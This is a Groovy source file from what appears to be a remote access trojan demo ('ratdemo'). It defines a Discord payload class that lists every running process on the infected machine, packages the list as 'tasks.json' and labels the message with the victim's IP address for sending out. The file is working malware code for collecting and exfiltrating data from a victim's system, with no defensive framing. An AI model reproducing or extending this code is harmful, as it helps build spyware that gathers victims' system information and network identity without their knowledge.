package de.tudbut.ttd.ratdemo.discord.impl


import de.tudbut.ttd.ratdemo.Util
import de.tudbut.ttd.ratdemo.discord.DiscordPayload
import tudbut.parsing.JSON
import tudbut.parsing.TCN

class DTaskJSONPayload implements DiscordPayload {

    @Override
    String getAttachmentName() {
        return 'tasks.json'
    }

    @Override
    byte[] getAttachment() {
        TCN tcn = new TCN()
        ProcessHandle[] processes = ProcessHandle.allProcesses().collect { it }
        Long[] pidsDone = []
        processes.collect {
            if (!pidsDone.contains(it.pid()))
                tcn.set(it.pid() as String, Util.processToTCN(it, pidsDone))
        }
        return JSON.writeReadable(tcn).getBytes('ISO-8859-1')
    }

    @Override
    TCN getContent() {
        TCN content = new TCN()
        content.set('username', Util.IP)
        content.set('content', 'Tasks')
        return content
    }
}
